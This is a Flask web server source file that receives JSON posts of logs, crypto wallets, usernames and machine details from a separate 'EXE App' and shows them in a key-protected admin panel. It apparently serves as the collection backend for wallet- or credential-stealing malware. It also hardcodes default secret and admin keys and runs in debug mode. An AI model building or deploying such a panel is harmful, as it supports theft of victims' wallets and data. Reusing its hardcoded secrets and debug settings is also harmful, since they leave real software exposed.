import os
import json
from flask import Flask, render_template, request, redirect, url_for, session, jsonify

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "supersecret")
ADMIN_AUTH_KEY = os.environ.get("ADMIN_AUTH_KEY", "6D93B8309F2A8B4E62B04D0F711A7C94")  # Replace with your real 24-char key

DATA_FILE = 'data.json'

def load_data():
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'w') as f:
            json.dump({"logs": [], "wallets": [], "usernames": [], "machines": []}, f)
    with open(DATA_FILE, 'r') as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# --- ADMIN PANEL AUTH ---
@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        key = request.form.get('auth_key')
        if key == ADMIN_AUTH_KEY:
            session['admin_authenticated'] = True
            return redirect(url_for('admin_panel'))
        else:
            return render_template('admin_login.html', error='Invalid key')
    if session.get('admin_authenticated'):
        return redirect(url_for('admin_panel'))
    return render_template('admin_login.html')

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_authenticated', None)
    return redirect(url_for('admin_login'))

@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin_authenticated'):
        return redirect(url_for('admin_login'))
    data = load_data()
    return render_template('admin_panel.html', data=data)

# --- API ENDPOINTS for EXE App ---
@app.route('/api/log', methods=['POST'])
def api_log():
    entry = request.json
    data = load_data()
    data['logs'].append(entry)
    save_data(data)
    return jsonify({'status': 'ok'})

@app.route('/api/wallet', methods=['POST'])
def api_wallet():
    entry = request.json
    data = load_data()
    data['wallets'].append(entry)
    save_data(data)
    return jsonify({'status': 'ok'})

@app.route('/api/username', methods=['POST'])
def api_username():
    entry = request.json
    data = load_data()
    data['usernames'].append(entry)
    save_data(data)
    return jsonify({'status': 'ok'})

@app.route('/api/machine', methods=['POST'])
def api_machine():
    entry = request.json
    data = load_data()
    data['machines'].append(entry)
    save_data(data)
    return jsonify({'status': 'ok'})

# --- Admin API for Live Refresh (optional) ---
@app.route('/admin/data')
def admin_data():
    if not session.get('admin_authenticated'):
        return jsonify({'error': 'unauthorized'}), 401
    data = load_data()
    return jsonify(data)

if __name__ == '__main__':
    app.run(debug=True)
